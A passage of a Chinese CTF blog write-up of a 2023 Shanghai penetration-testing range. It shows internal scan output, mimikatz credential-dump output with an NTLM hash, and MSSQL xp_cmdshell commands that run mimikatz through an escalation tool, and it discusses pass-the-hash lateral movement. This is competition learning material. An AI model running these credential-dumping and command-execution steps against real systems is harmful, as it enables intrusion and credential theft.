  10.103.209.123        52-54-59-67-4d-4b     动态
  10.103.215.14         52-54-4f-6c-aa-ba     动态
  10.103.216.75         52-54-28-26-b5-b1     动态
  10.103.224.15         52-54-36-60-d7-36     动态
  10.103.234.138        52-54-22-6c-0d-9e     动态
  10.103.234.181        52-54-01-70-01-02     动态
  10.103.238.167        52-54-1c-2e-da-6f     动态
  10.103.241.244        52-54-0d-6f-34-f2     动态
  10.103.255.255        ff-ff-ff-ff-ff-ff     静态
  224.0.0.22            01-00-5e-00-00-16     静态
  224.0.0.252           01-00-5e-00-00-fc     静态
  239.255.255.250       01-00-5e-7f-ff-fa     静态
  255.255.255.255       ff-ff-ff-ff-ff-ff     静态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<pre class="line-numbers language-none"><code class="language-none">192.168.33.175/24 is Valid CIDR
IPCound: 256
Scan Start: 2023-05-22 03:21:34
 SMB: 192.168.33.175    WIN-FGHCOKNHM7P (Win2016-Datacenter-14393 10.0.14393 Win 10, 1607) Domain:WIN-FGHCOKNHM7P Dns:WIN-FGHCOKNHM7P SMBSigning:False
 SMB: 192.168.33.174    PC01            (Win 10, 2004 10.0.19041) Domain:CTF1 Dns:ctf1.idss SMBSigning:False
 NBT: 192.168.33.174    PC01            52-54-6B-4D-3E-31  CTF1
 WMI: 192.168.33.174    PC01            (Win 10, 2004 X64 10.0.19041) Domain:CTF1 Dns:ctf1.idss
Winrm 192.168.33.175    WIN-FGHCOKNHM7P (Win 2016 10.0.14393) Domain:WIN-FGHCOKNHM7P Dns:WIN-FGHCOKNHM7P
 WMI: 192.168.33.175    WIN-FGHCOKNHM7P (Win 2016 X64 10.0.14393) Domain:WIN-FGHCOKNHM7P Dns:WIN-FGHCOKNHM7P
 DNS: 192.168.33.175    WIN-FGHCOKNHM7P
 DNS: 192.168.33.174    PC01
 RDP: 192.168.33.175    Win10/Win2016
MSSQL 192.168.33.175    WIN-FGHCOKNHM7P (Win 2016 10.0.14393) Domain:WIN-FGHCOKNHM7P Dns:WIN-FGHCOKNHM7P
 RDP: 192.168.33.174    Win10/Win2016
HTTPS 192.168.33.175    WIN-FGHCOKNHM7P []      []
HTTPS 192.168.33.174    PC01            []      []
 SMB: 192.168.33.175            WIN-FGHCOKNHM7P (Win2016-Datacenter-14393 10.0.14393 Win 10, 1607)  Domain:WIN-FGHCOKNHM7P      Signing:False
Error: http://192.168.33.175 无法连接到远程服务器
Error: http://192.168.33.175 无法连接到远程服务器
Error: http://192.168.33.175 无法连接到远程服务器
Struts2Check [S2-016] http://192.168.33.175
Error: http://192.168.33.175 未将对象引用设置到对象的实例。
Error: http://192.168.33.175 无法连接到远程服务器
Error: http://192.168.33.174 无法连接到远程服务器
Error: http://192.168.33.175 无法连接到远程服务器
Struts2Check [S2-DevMode] http://192.168.33.175
Error: http://192.168.33.174 无法连接到远程服务器
Error: http://192.168.33.175 未将对象引用设置到对象的实例。
Error: http://192.168.33.174 无法连接到远程服务器
Struts2Check [S2-016] http://192.168.33.174
Error: http://192.168.33.174 未将对象引用设置到对象的实例。
Error: http://192.168.33.174 无法连接到远程服务器
Error: http://192.168.33.174 无法连接到远程服务器
Struts2Check [S2-DevMode] http://192.168.33.174
Error: http://192.168.33.174 未将对象引用设置到对象的实例。
=============================================
OnlinePC:2
Cidr Scan Finished!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> mimikatz</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz(commandline) # sekurlsa::logonpasswords full
...
Authentication Id : 0 ; 85624 (00000000:00014e78)
Session           : Service from 0
User Name         : SQLTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2023/5/22 3:47:09
SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
        msv :
        tspkg :
        wdigest :
         * Username : WIN-FGHCOKNHM7P$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : SQLTELEMETRY
         * Domain   : NT Service
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 55853 (00000000:0000da2d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/5/22 3:47:07
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : WIN-FGHCOKNHM7P$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 55817 (00000000:0000da09)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/5/22 3:47:07
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : WIN-FGHCOKNHM7P$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WIN-FGHCOKNHM7P$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2023/5/22 3:47:06
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : WIN-FGHCOKNHM7P$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : win-fghcoknhm7p$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 26460 (00000000:0000675c)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2023/5/22 3:47:06
SID               :
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 1955463 (00000000:001dd687)
Session           : RemoteInteractive from 3
User Name         : root
Domain            : WIN-FGHCOKNHM7P
Logon Server      : WIN-FGHCOKNHM7P
Logon Time        : 2023/5/22 3:52:56
SID               : S-1-5-21-1647943479-1973672040-3450735074-1003
        msv :
         [00000003] Primary
         * Username : root
         * Domain   : WIN-FGHCOKNHM7P
         * NTLM     : 4ffda97268f45d1e96a3e5a05ba038b8
         * SHA1     : 4694ea6285062a9c5ce6ecf58fbb779a0e508492
        tspkg :
        wdigest :
         * Username : root
         * Domain   : WIN-FGHCOKNHM7P
         * Password : (null)
        kerberos :
         * Username : root
         * Domain   : WIN-FGHCOKNHM7P
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 355158 (00000000:00056b56)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/5/22 3:50:53
SID               : S-1-5-90-0-2
        msv :
        tspkg :
        wdigest :
         * Username : WIN-FGHCOKNHM7P$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 84721 (00000000:00014af1)
Session           : Service from 0
User Name         : MSSQLSERVER
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 2023/5/22 3:47:09
SID               : S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
        msv :
        tspkg :
        wdigest :
         * Username : WIN-FGHCOKNHM7P$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : MSSQLSERVER
         * Domain   : NT Service
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/5/22 3:47:07
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : WIN-FGHCOKNHM7P$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2023/5/22 3:47:06
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : WIN-FGHCOKNHM7P$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : win-fghcoknhm7p$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>root 是我们加进去的，抓不到 Administrator 的？</p>
<p>重新开了台试试</p>
<pre class="line-numbers language-none"><code class="language-none">use master;
exec master..xp_cmdshell 'echo C:\Users\MSSQLSERVER\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit &gt; C:\Users\Public\1.bat'
exec master..xp_cmdshell 'C:\Users\public\3.exe -p "C:\Users\Public\1.bat" -c {0134A8B2-3407-4B45-AD25-E9F7C92A80BC}';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/b6916809-ab4f-4ef1-bacd-3e672822e40d.png"></p>
<p>啥也没有啊，摸了（</p>
<p>感觉内网这台 Win10 192.168.33.174 PC01 应该是借助 175 这台入口机器的密码或者哈希横向过去，用 PsExec 之类的工具吧。</p>
<p>但是不懂为啥没抓到 hash，麻了（</p>
<blockquote>
<p>赛后发现是确实是抓 Administrator 的 hash，然后 hash 传递过去。。第一个 flag 在 174 win10 上，而他在域里，还有一台在 174 机器的另一个子网下，需要爆破域用户的密码然后借助 CVE 横向过去……</p>
<p>不过没时间赶不上复现了，摸！</p>
</blockquote>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>于是通宵打了两天漏洞渗透靶场，累死了</p>
<p>感觉 Windows 攻防这一块喵喵还不大熟悉，后面有机会有空的话再来补一补.jpg <em><del>（咕咕咕</del></em></p>
<p>吐槽一下怎么不是所有机器都有 flag，好不容易日了一台机器下来，上去发现啥都没有，好亏啊！</p>
<p>（然后又想到去年线下打鹏城杯那个靶场，靶机里数据库 web服务 root下 好几个地方放了 flag，虽然容易漏但是至少拿下机器 shell 有 flag 的反馈还是挺乐的，虽然打得也挺累的就是了。</p>
<p>还有个挺坑的地方是，他靶机的 DNS 都配的是 192.168 下的，但是那个 IP 又连不通，于是如果反弹 shell 或者下载带域名的 URL 就解析不出来了，整的喵喵还以为不通外网，后来直接试 IP 发现能访问才猜到是这样的。</p>
<p>而且 VPN 网段不能弹 shell 回来，中间的路由直接丢了，而且通过 VPN 访问也是走的中间的机器跳过去的（</p>
<p>不过这漏洞挖掘的比赛也好卷啊！</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/image-20230606050443775.png"></p>
<p>喵喵一个人拿了 1k 分，也就是拿了 5 个 flag，人麻了（</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/image-20230606050502201.png"></p>
<p>可惜最后 CTF 和 漏洞挖掘 居然是按照 7:3 的比例把分数加起来，感觉亏死了！！！</p>
<p>于是连着打了三天，累累，呜呜（</p>
<p><del><em>不过上海高校单独排名，躺着也能进</em></del>  线下决赛见喵~</p>
<p><em>不过说来这应该是喵喵最后一次打上海市赛了吧（喵呜喵呜喵</em></p>
<blockquote>
<p><strong>官方 writeup 也出来了：</strong></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/myZpsxRkqOIUzCfhWpoRDg">第八届上海市大学生网络安全大赛暨“磐石行动”2023（首届）大学生网络安全邀请赛–漏洞挖掘赛 官方WP</a></p>
</blockquote>
<p><em>（溜了溜了喵</em></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz" rel="external nofollow noreferrer">MiaoTony</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://miaotony.xyz/2023/05/30/Pentest_2023ShanghaiPanshixingdong/">https://miaotony.xyz/2023/05/30/Pentest_2023ShanghaiPanshixingdong/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特别声明外，均采用
                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a>
                    许可协议。转载请注明来源
                    <a href="https://miaotony.xyz" target="_blank">MiaoTony</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,twitter,facebook,google,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">打赏一下让我来点好吃好玩的呗~</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <!-- 
                            <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li> 
                        -->
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <!-- 
                        <div id="alipay">
                        <img src="/" class="reward-img" alt="支付宝打赏二维码">
                        </div> 
                -->
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    
        <link rel="stylesheet" href="/libs/gitalk/gitalk.min.css">
<link rel="stylesheet" href="/css/my-gitalk.css">

<div class="card gitalk-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="gitalk-container" class="card-content"></div>
</div>

<script src="/libs/gitalk/gitalk.min.js"></script>
<script>
    let gitalk = new Gitalk({
        clientID: '116343b4650fce4789b6',
        clientSecret: '3e9be2ad6c9b693af1753290c7c059b1e4f34d5d',
        repo: 'miaotony.github.io',
        owner: 'miaotony',
        admin: "miaotony",
        id: '2023-05-30T20-25-00',
        distractionFreeMode: false  // Facebook-like distraction free mode
    });

    gitalk.render('gitalk-container');
</script>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/06/02/CTF_2023CISCN_preliminary/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="CTF | 2023 CISCN 第十六届全国大学生信息安全竞赛 初赛 WriteUp">
                        
                        <span class="card-title">CTF | 2023 CISCN 第十六届全国大学生信息安全竞赛 初赛 WriteUp</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            又是一年一度的国赛，非常感谢队友带喵喵进了分区赛，这里来记录一下初赛的writeup。
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-06-02
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            MiaoTony
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2023/05/25/CTF_2023ShanghaiPanshixingdong/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="CTF | 2023 第八届上海市大学生网络安全大赛 / 磐石行动 CTF部分 WriteUp">
                        
                        <span class="card-title">CTF | 2023 第八届上海市大学生网络安全大赛 / 磐石行动 CTF部分 WriteUp</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            上海市赛又来了，今年的比赛分为CTF和漏洞挖掘两部分，这篇博客就来记录下CTF部分的writeup，有些题目喵喵卡住了赛后又来复现了一下。
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-25
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            MiaoTony
                            
                        </span>
                    </div>
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('200')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + '来源: MiaoTony&#39;s小窝<br />'
            + '文章作者: MiaoTony<br />'
            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者 MiaoTony 所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h2, h3, h4, h5'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4, h5').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
        <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2023</span>
            
            <a href="/about" target="_blank">MiaoTony</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
                        &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">447.7k</span>&nbsp;字
                                                                                    <span id="busuanzi_container_site_pv">
			|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
                                    <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
                        <br>
                        <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2019";
                    var startMonth = "11";
                    var startDate = "28";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
                        <br>
                    </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://t.me/MiaoTonyChannel" class="tooltipped" target="_blank" data-tooltip="关注我的TelegramChannel: @MiaoTonyChannel" data-position="top" data-delay="50">
        <i class="fab fa-telegram"></i>
    </a>



    <a href="https://github.com/miaotony" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:miaotony@outlook.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>













    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
